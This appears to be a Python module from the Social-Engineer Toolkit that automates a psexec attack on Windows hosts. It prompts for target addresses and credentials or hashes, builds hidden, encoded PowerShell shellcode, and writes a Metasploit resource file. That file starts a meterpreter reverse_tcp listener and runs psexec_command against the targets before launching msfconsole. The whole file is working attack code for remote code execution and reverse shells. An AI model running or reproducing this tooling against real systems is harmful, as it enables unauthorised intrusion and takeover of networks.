#############################################
#
# Main SET module for psexec 
#
#############################################
from src.core.setcore import *

# Module options (auxiliary/admin/smb/psexec_command):

#   Name       Current Setting                    Required  Description
#   ----       ---------------                    --------  -----------
#   COMMAND    net group "Domain Admins" /domain  yes       The command you want to execute on the remote host
#   RHOSTS                                        yes       The target address range or CIDR identifier
#   RPORT      445                                yes       The Target port
#   SMBDomain  WORKGROUP                          no        The Windows domain to use for authentication
#   SMBPass                                       no        The password for the specified username
#   SMBSHARE   C$                                 yes       The name of a writeable share on the server
#   SMBUser                                       no        The username to authenticate as
#   THREADS    1                                  yes       The number of concurrent threads
#   WINPATH    WINDOWS                            yes       The name of the remote Windows directory

# msf auxiliary(psexec_command) >

# grab config options for stage encoding
stage_encoding = check_config("STAGE_ENCODING=").lower()
if stage_encoding == "off": stage_encoding = "false"
else: stage_encoding = "true"

rhosts=raw_input(setprompt(["32"], "Enter the IP Address or range (RHOSTS) to connect to")) # rhosts
username=raw_input(setprompt(["32"], "Enter the username")) # username for domain/workgroup
password=raw_input(setprompt(["32"], "Enter the password or the hash")) # password for domain/workgroup
domain=raw_input(setprompt(["32"], "Enter the domain name (hit enter for logon locally)")) # domain name
threads=raw_input(setprompt(["32"], "How many threads do you want [enter for default]"))
# if blank specify workgroup which is the default
if domain == "": domain = "WORKGROUP"
# set the threads
if threads == "": threads = "15"

payload = check_config("POWERSHELL_INJECT_PAYLOAD_X86=").lower()

#
# payload generation for powershell injection
#

try:

   # specify ipaddress of reverse listener
    ipaddr = grab_ipaddress()
    update_options("IPADDR=" + ipaddr)
    port = raw_input(setprompt(["29"], "Enter the port for the reverse [443]"))
    if port == "": port = "443"
    update_options("PORT=" + port)
    filewrite = file(setdir + "/payload_options.shellcode", "w")
    # format needed for shellcode generation
    filewrite.write(payload + " " + port + ",")
    filewrite.close()
    update_options("POWERSHELL_SOLO=ON")
    print_status("Prepping the payload for delivery and injecting alphanumeric shellcode...")
    try: reload(src.payloads.powershell.prep)
    except: import src.payloads.powershell.prep
    # create the directory if it does not exist
    if not os.path.isdir(setdir + "/reports/powershell"):
       os.makedirs(setdir + "/reports/powershell")

    x86 = file(setdir + "/x86.powershell", "r")
    x86 = x86.read()
    x86 = "powershell -nop -win hidden -noni -enc " + x86
    print_status("If you want the powershell commands and attack, they are exported to %s/reports/powershell/" % (setdir))
    filewrite = file(setdir + "/reports/powershell/x86_powershell_injection.txt", "w")
    filewrite.write(x86)
    filewrite.close()
    payload = "windows/meterpreter/reverse_tcp\n" # if we are using x86
    command = x86 # assign powershell to command

    # write out our answer file for the powershell injection attack
    filewrite = file(setdir + "/reports/powershell/powershell.rc", "w")
    filewrite.write("use multi/handler\nset payload windows/meterpreter/reverse_tcp\nset LPORT %s\nset LHOST 0.0.0.0\nset ExitOnSession false\nexploit -j\nuse auxiliary/admin/smb/psexec_command\nset RHOSTS %s\nset SMBUser %s\nset SMBPass %s\nset SMBDomain %s\nset THREADS %s\nset COMMAND %s\nset EnableStageEncoding %s\nset ExitOnSession false\nexploit\n" % (port,rhosts,username,password,domain,threads,command, stage_encoding))
    filewrite.close()
    # launch metasploit below
    print_status("Launching Metasploit.. This may take a few seconds.")
    subprocess.Popen("%smsfconsole -r %s/reports/powershell/powershell.rc" % (meta_path(),setdir), shell=True).wait()

# handle exceptions
except Exception, e:
    print_error("Something went wrong printing error: " + str(e))
